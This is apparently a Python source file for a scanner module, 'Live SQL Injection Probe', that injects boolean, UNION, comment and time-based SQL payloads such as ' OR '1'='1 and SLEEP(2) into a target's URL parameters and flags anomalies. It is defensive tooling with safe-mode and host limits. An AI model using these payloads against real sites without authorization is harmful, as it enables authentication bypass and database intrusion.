from __future__ import annotations

from collections import defaultdict
from dataclasses import dataclass
from typing import Iterable, List
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse
from uuid import uuid4

from app.http.executor import ExecutionOptions, HttpExecutionError, HttpRequestSpec, execute_request
from app.models.http import HttpInteraction, HttpMethod
from app.models.scan import Finding, FindingSeverity
from app.modules.base import ExecutionResult, ModuleMetadata, ScannerModule
from app.modules.simulated_sqli import SimulatedSQLiModule


@dataclass(slots=True)
class Payload:
    label: str
    value: str
    strategy: str
    severity: FindingSeverity
    description: str
    method: HttpMethod = HttpMethod.GET
    additional_param: str | None = None


class LiveSQLiModule(ScannerModule):
    metadata = ModuleMetadata(
        id="live_sqli",
        name="Live SQL Injection Probe",
        description=(
            "Attempts boolean, union, comment, and time-based SQL injection checks by replaying parameterized requests. "
            "Requires explicit safe_mode=False and signed authorization."
        ),
        safe_mode_only=False,
    )

    time_threshold_ms: float = 1500.0

    payloads: List[Payload] = [
        Payload(
            label="boolean_or_true",
            value="' OR '1'='1",
            strategy="boolean_true",
            severity=FindingSeverity.HIGH,
            description="Boolean true check that often bypasses authentication.",
        ),
        Payload(
            label="boolean_or_false",
            value="' OR '1'='0",
            strategy="boolean_false",
            severity=FindingSeverity.MEDIUM,
            description="Boolean false control to compare responses for inference.",
        ),
        Payload(
            label="error_based_quote",
            value="'",
            strategy="error_trigger",
            severity=FindingSeverity.HIGH,
            description="Triggers syntax errors on unhandled single quotes.",
        ),
        Payload(
            label="comment_truncation",
            value="'--",
            strategy="comment",
            severity=FindingSeverity.MEDIUM,
            description="Attempts to truncate trailing logic using SQL comment tokens.",
        ),
        Payload(
            label="union_select_null",
            value="' UNION SELECT NULL--",
            strategy="union_select",
            severity=FindingSeverity.HIGH,
            description="Union select probe to detect column leakage via error signatures or response deltas.",
        ),
        Payload(
            label="stacked_sleep",
            value="'; SLEEP(2); --",
            strategy="time_delay",
            severity=FindingSeverity.HIGH,
            description="Attempts stacked query execution with server-side delay.",
        ),
        Payload(
            label="and_sleep",
            value="' AND SLEEP(2)--",
            strategy="time_delay",
            severity=FindingSeverity.HIGH,
            description="Boolean style time delay to detect timing-based vulnerabilities.",
        ),
        Payload(
            label="or_sleep",
            value="""' OR IF(1=1, SLEEP(2), 0)--""",
            strategy="time_delay",
            severity=FindingSeverity.HIGH,
            description="Conditional sleep payload for error-suppressed environments.",
        ),
        Payload(
            label="parameter_injection",
            value="' OR '1'='1",
            strategy="new_parameter",
            severity=FindingSeverity.MEDIUM,
            description="Adds a new probe parameter alongside the original to test parsing quirks.",
            additional_param="sqlmap_pro_probe",
        ),
    ]

    error_signatures: Iterable[str] = (
        "sql syntax",
        "mysql_fetch",
        "psql: error",
        "unclosed quotation mark",
        "sqlite error",
        "mysql_num_rows",
        "warning: mysql",
    )

    def execute(self, target: str, safe_mode: bool = True) -> ExecutionResult:
        parsed = urlparse(target)
        if not parsed.scheme or not parsed.netloc:
            raise HttpExecutionError("Target URL must include scheme and hostname")

        allowed_hosts = {parsed.hostname} if parsed.hostname else set()
        interactions: List[HttpInteraction] = []
        findings: List[Finding] = []

        # Collect baseline for comparison.
        baseline = execute_request(
            HttpRequestSpec(url=target, method=HttpMethod.GET),
            ExecutionOptions(safe_mode=True, allowed_hosts=allowed_hosts),
        )
        interactions.append(baseline)

        if safe_mode:
            simulated = SimulatedSQLiModule()
            simulated_result = simulated.execute(target=target, safe_mode=True)
            findings.extend(simulated_result.findings)
            interactions.extend(simulated_result.interactions)
            return ExecutionResult(findings=findings, interactions=interactions)

        params = parse_qsl(parsed.query, keep_blank_values=True)
        baseline_status = baseline.response.status_code
        baseline_len = len(baseline.response.body_excerpt or "")
        baseline_elapsed = baseline.response.elapsed_ms

        # If the URL has no parameters, inject a probe parameter so payloads can still be tested.
        if not params:
            params = [("sqlmap_pro_probe", "1")]

        evidence_hits: dict[str, List[dict]] = defaultdict(list)
        attempt_log: List[dict] = []

        for index, (name, value) in enumerate(list(params)):
            for payload in self.payloads:
                mutated_params = list(params)
                if payload.strategy == "new_parameter" and payload.additional_param:
                    mutated_params.append((payload.additional_param, payload.value))
                else:
                    mutated_params[index] = (name, value + payload.value)

                mutated_query = urlencode(mutated_params)
                mutated_url = urlunparse(
                    (
                        parsed.scheme,
                        parsed.netloc,
                        parsed.path,
                        parsed.params,
                        mutated_query,
                        parsed.fragment,
                    )
                )

                try:
                    interaction = execute_request(
                        HttpRequestSpec(url=mutated_url, method=payload.method),
                        ExecutionOptions(safe_mode=False, allowed_hosts=allowed_hosts),
                    )
                except HttpExecutionError as exc:
                    evidence_hits[name].append(
                        {
                            "payload": payload.label,
                            "mutation": mutated_url,
                            "reason": str(exc),
                            "status": "network_error",
                        }
                    )
                    attempt_log.append(
                        {
                            "parameter": name,
                            "payload": payload.label,
                            "strategy": payload.strategy,
                            "url": mutated_url,
                            "result": "network_error",
                            "message": str(exc),
                        }
                    )
                    continue

                interactions.append(interaction)

                body_excerpt = interaction.response.body_excerpt or ""
                body_lower = body_excerpt.lower()
                status_code = interaction.response.status_code
                length_delta = abs(len(body_excerpt) - baseline_len)
                elapsed_ms = interaction.response.elapsed_ms

                reason = None
                if status_code >= 500 or any(sig in body_lower for sig in self.error_signatures):
                    reason = "error_signature"
                elif payload.strategy == "time_delay" and elapsed_ms - baseline_elapsed > self.time_threshold_ms:
                    reason = "timing_delay"
                elif status_code != baseline_status and length_delta > 200:
                    reason = "response_delta"

                if reason:
                    evidence_hits[name].append(
                        {
                            "payload": payload.label,
                            "mutation": mutated_url,
                            "reason": reason,
                            "status_code": status_code,
                            "length_delta": length_delta,
                            "elapsed_ms": elapsed_ms,
                        }
                    )

                attempt_log.append(
                    {
                        "parameter": name,
                        "payload": payload.label,
                        "strategy": payload.strategy,
                        "url": mutated_url,
                        "status_code": status_code,
                        "elapsed_ms": elapsed_ms,
                        "length_delta": length_delta,
                        "reason": reason or "clean",
                    }
                )

        if evidence_hits:
            has_error_signature = any(
                hit.get("reason") == "error_signature"
                for hits in evidence_hits.values()
                for hit in hits
            )
            has_timing = any(
                hit.get("reason") == "timing_delay"
                for hits in evidence_hits.values()
                for hit in hits
            )
            severity = FindingSeverity.HIGH if has_error_signature else (
                FindingSeverity.HIGH if has_timing else FindingSeverity.MEDIUM
            )
            findings.append(
                Finding(
                    id=str(uuid4()),
                    module_id=self.metadata.id,
                    title="Potential SQL injection behaviour detected",
                    description=(
                        "Parameter tampering produced responses indicative of SQL injection risk. "
                        "Review evidence and validate manually before escalating."
                    ),
                    severity=severity,
                    recommendation=(
                        "Adopt parameterized queries and server-side input validation. Compare application behaviour "
                        "between baseline and mutated inputs to confirm exploitability."
                    ),
                    evidence={
                        "parameters": evidence_hits,
                        "baseline_status": baseline_status,
                        "baseline_elapsed_ms": baseline_elapsed,
                        "attempts": attempt_log,
                        "timing_indicators": has_timing,
                    },
                )
            )
        else:
            findings.append(
                Finding(
                    id=str(uuid4()),
                    module_id=self.metadata.id,
                    title="No SQL injection anomalies detected",
                    description="Payloads did not elicit SQL error signatures, timing anomalies, or significant response deltas.",
                    severity=FindingSeverity.INFO,
                    recommendation="Consider expanding scope with additional payloads or manual validation.",
                    evidence={
                        "checked_parameters": list({name for name, _ in params}),
                        "baseline_status": baseline_status,
                        "baseline_elapsed_ms": baseline_elapsed,
                        "attempts": attempt_log,
                    },
                )
            )

        return ExecutionResult(findings=findings, interactions=interactions)


MODULE = LiveSQLiModule()
